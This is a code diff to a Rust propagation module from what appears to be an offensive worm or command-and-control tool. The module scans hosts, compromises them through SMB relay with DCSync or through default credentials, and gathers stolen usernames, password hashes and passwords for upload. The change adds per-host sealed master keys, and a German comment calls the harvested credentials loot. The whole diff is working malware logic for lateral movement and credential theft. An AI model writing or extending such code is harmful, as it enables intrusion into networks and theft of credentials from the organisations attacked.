@@ -13,6 +13,8 @@ use std::net::IpAddr;
 use kx_core::c2::{self, RegisterRequest, SecretUpload};
 use kx_exploit::{smb_relay_dcsync, try_default_credentials, RelayConfig};
 use kx_scanner::{scan_tcp, DiscoveredHost, ScanResults};
+
+use crate::hostkey::KeySealer;
 use tracing::{debug, info, warn};
 
 /// Ergebnis eines Propagationslaufs.
@@ -56,6 +58,7 @@ fn service_for_port(port: u16) -> &'static str {
 pub async fn run_propagation(
     discovered: &[DiscoveredHost],
     relay_script: &str,
+    sealer: Option<&KeySealer>,
 ) -> PropagationResults {
     let mut results = PropagationResults {
         new_hosts: Vec::new(),
@@ -75,6 +78,11 @@ pub async fn run_propagation(
         let host_id = host.to_string();
         let mut status = c2::STATUS_DISCOVERED.to_string();
         let mut os: Option<String> = None;
+
+        // Je Host ein eigener Master-Key: die Beute dieses Hosts laesst sich
+        // nur mit dem Schluessel dieses Hosts lesen.
+        let host_schluessel = sealer.and_then(|s| s.seal_for_host());
+        let master_key = host_schluessel.as_ref().map(|k| k.master_key.clone());
 
         for port in ports {
             let service = service_for_port(*port);
@@ -97,7 +105,7 @@ pub async fn run_propagation(
                                 username: c.username,
                                 password: c.hash,
                                 source: Some("smb_relay".into()),
-                                master_key: None,
+                                master_key: master_key.clone(),
                             });
                         }
                         status = c2::STATUS_COMPROMISED.to_string();
@@ -116,7 +124,7 @@ pub async fn run_propagation(
                         username: auth.username,
                         password: auth.password,
                         source: Some("default_creds".into()),
-                        master_key: None,
+                        master_key: master_key.clone(),
                     });
                     status = c2::STATUS_COMPROMISED.to_string();
                 }
@@ -132,8 +140,8 @@ pub async fn run_propagation(
             hostname: None,
             os,
             status: Some(status),
-            sealed_master: None,
-            master_key: None,
+            sealed_master: host_schluessel.as_ref().map(|k| k.sealed_master.clone()),
+            master_key,
         });
     }
 
